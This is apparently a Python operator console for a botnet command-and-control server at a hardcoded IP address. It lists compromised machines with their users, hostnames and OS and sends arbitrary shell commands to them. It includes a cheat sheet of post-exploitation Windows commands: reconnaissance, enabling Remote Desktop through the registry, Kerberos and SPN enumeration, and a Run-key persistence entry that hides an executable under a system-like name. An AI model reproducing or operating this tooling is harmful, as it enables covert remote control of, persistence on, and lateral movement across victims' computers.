#!/usr/bin/python3


import urllib.request
import urllib.parse
import datetime
import time
import sys



class bots():
	def __init__(self):
		self.botName = []

	def addBot(self, name):
		self.botName.append(name)
		return self

	def removeBot(self, name):
		self.botName.remove(name)
		return self

class bot:
	def __init__(self, name, notes, ipAddr, user, hostname, ipList, os, dateAdded, dateLast, command):
		self.name = name
		self.notes = notes
		self.localnotes = ""
		self.ipAddr = ipAddr
		self.user = user
		self.hostname = hostname
		self.ipList = ipList
		self.os = os
		self.dateAdded = dateAdded
		self.dateLast = dateLast
		self.command = command
		self.lastCommand = ""




class history():
	def __init__(self):
		self.Notes = []

	def addNote(self, name):
		self.Notes.append(name)
		return self

	def removeNote(self, name):
		self.Notes.remove(name)
		return self

class record:
	def __init__(self, botName, commandid, command, results, dateAdded):
		self.botName = botName
		self.commandid = commandid
		self.command = command
		self.results = results
		self.dateAdded = dateAdded


def showCheatSheet():
	print("")
	print("Command Line Cheat Sheet")
	print("----------------------------")
	print("tasklist - Dispalys a simple tasklist")
	print("wmic process list full - Displays a full task list with detail")
	print("net start - Simple list of started services")
	print("tasklist /svc - Tasks running associated to a service")
	print("sc query - Detailed list of started services")
	print('reg query hklm\software\microsoft\windows\currentversion\\run - Query Registry')
	print('net view \\\\127.0.0.1 - View Local File Shares')
	print("net session - View open sessions")
	print("net use - Display mapped drives")
	print("netstat -ano - Show network connections")
	print("netsh firewall show config - Show Windows Firewall Config")	
	print("schtasks - Show Scheduled Tasks")
	print("net user <name> OR net user <name> /domain")
	print("whoami OR whoami /all")
	print("net localgroup administrators - View Local Admins")
	print('reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f - Enable Remote Desktop')
	print("setspn -T <user account> -F -Q */* -- Identify additional information about a domain account")
	print("klist.exe - Shows the current kerberos tickets that are cached")
	print('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Client Server Runtime Process" /t REG_SZ /F /D "C:\\Users\\thepcn3rd\AppData\Roaming\Microsoft\cssrs.exe"')
	print("")
	



def sendCommand(ibot):
	global serverIP
	print("")
	print("Sent Command to Queue of Server")
	print("---------------------------------------------------------")
	print("Note: Depending on how frequent the bot checks in will")
	print("      determine if the command was executed. By default")
	print("	     this is every 30 seconds.")
	print("")
	print("S. Show Command Line Cheat Sheet")
	print("")
	command = input(ibot.name + "$ ")
	print("")
	if command == 'S' or command == 's':
		showCheatSheet()
		sendCommand(ibot)
	else:
		ibot.lastCommand = command
		commandURLEncoded = command.replace(" ","%20")
		epochTime = int(time.time())
		URL = serverIP 
		URL += "/send?botName=" + ibot.name 
		URL += "&commandID=" + str(epochTime)
		URL += "&command=" + commandURLEncoded
		print(URL)
		data = urllib.request.urlopen(URL)
		htmlBytes = data.read()
		html = htmlBytes.decode("utf8")
		print("")
		print("Command Sent to Bot " + ibot.name + " Successfully")
		print("")
		#def __init__(self, botName, commandid, command, results, dateAdded):
		now = datetime.datetime.now()
		logtime = now.strftime("%m-%d-%Y %H:%M")
		listHistory.addNote(record(ibot.name, epochTime, command, "", logtime)) 
	



def interactBot(sbot):
	global listBots, listHistory
	selection = ""
	while (selection != 'R' and selection != 'r'):
		print("")
		print("Bot Information and Interaction - " + sbot.name)
		print("---------------------------------------------------")
		print("User - " + sbot.user)
		print("Hostname - " + sbot.hostname)
		print("IP List - " + sbot.ipList)
		print("OS - " + sbot.os)
		print("Date Found - " + sbot.dateAdded)
		print("Last Checkin - " + sbot.dateLast)
		print("Last Sent Command - " + sbot.lastCommand)
		print("Note - " + sbot.localnotes)
		print("")
		print("C. Change Note")
		print("H. View/Pull History from Server")
		print("L. View History of Sent Commands")
		print("S. Send Command")
		print("")
		print("R. Return")
		print("")
		selection = input(sbot.name + "> ")
		if selection == "C" or selection == "c":
			print("")
			sbot.localnotes = input("Change note to: ")
			print("")
		elif selection == "S" or selection == "s":
			sendCommand(sbot)
		elif selection == "L" or selection == "l":
			for item in listHistory.Notes:
				if item.botName == sbot.name:
					print(item.botName + ": " + item.command + " - " + item.dateAdded)




def selectBot():
	global listBots
	selectionBot = ""
	while (selectionBot != 'R' and selectionBot != 'r'):
		botCount = 0
		selectionBot = ""
		print("")
		print("Select Bot")
		print("---------------------------------------------")
		for ibot in listBots.botName:
			botCount += 1
			botInfo = str(botCount) + ". "
			botInfo += ibot.name + " "
			botInfo += "Notes:"  + ibot.notes + " User:" + ibot.user + " OS:" + ibot.os + " Last Communication:" + ibot.dateLast
			print(botInfo)
		print("")
		print("R. Return")
		selectionBot = input("> ")
		numb = int(selectionBot)
		if numb <= botCount:
			interactBot(listBots.botName[numb-1])
		elif selectionBot == 'r' or selectionBot == 'R':
				break
		print("")


def gatherBotNames(URL):
	global listBots
	try:
		data = urllib.request.urlopen(URL)
		htmlBytes = data.read()
	except:
		print("")
		print("Unable to connect to C2 URL!!")
		print("")
		main()
	html = htmlBytes.decode("utf8")
	print("")
	print("Information Pulled about Bots")
	print("---------------------------------------------")
	print(html)
	print("")
	htmlParsed = html.split("\r\n")
	for line in htmlParsed:
		if len(line) > 1:
			#print("Length Line:" + str(len(line)))
			items = line.split("|")
			hBotName = items[0]
			hNotes = items[1]
			hIPAddr = items[2]
			hUser = items[3]
			hHostname = items[4]
			hIPList = items[5]
			hOS = items[6]
			hDateAdded = items[7]
			hDateLast = items[8]
			hCommand = items[9]
			listBots.addBot(bot(hBotName, hNotes, hIPAddr, hUser, hHostname, hIPList, hOS, hDateAdded, hDateLast, hCommand))
	#def __init__(self, name, notes, ipAddr, user, hostname, ipList, os, dateAdded, dateLast, command):
	#testBot1|||test|botTest1|172.16.5.5,192.168.23.5|Linux|12-26-2018 09:12|12-26-2018 09:12||
	#testBot2|||test|botTest2|172.16.5.5,192.168.23.5|Linux|12-26-2018 09:12|12-26-2018 09:12||




def main():
	global serverIP, gatherURL
	selectionMain = ""
	while (selectionMain != 'Q' and selectionMain != 'q'):
		selectionMain = ''
		print("")
		print("Bot Controller - URL: " + serverIP)
		print("---------------------------------------------")
		print("1. Gather Bot Names")
		print("2. Interact with Bot")
		print("")
		print("Q. Quit")
		selectionMain = input("> ")
		if selectionMain == "1":
			gatherBotNames(gatherURL)
		elif selectionMain == "2":
			selectBot()
			




serverIP = "http://45.62.232.167"
gatherURL = serverIP + "/gather"
listBots = bots()
listHistory = history()
localHistory = history()
main()
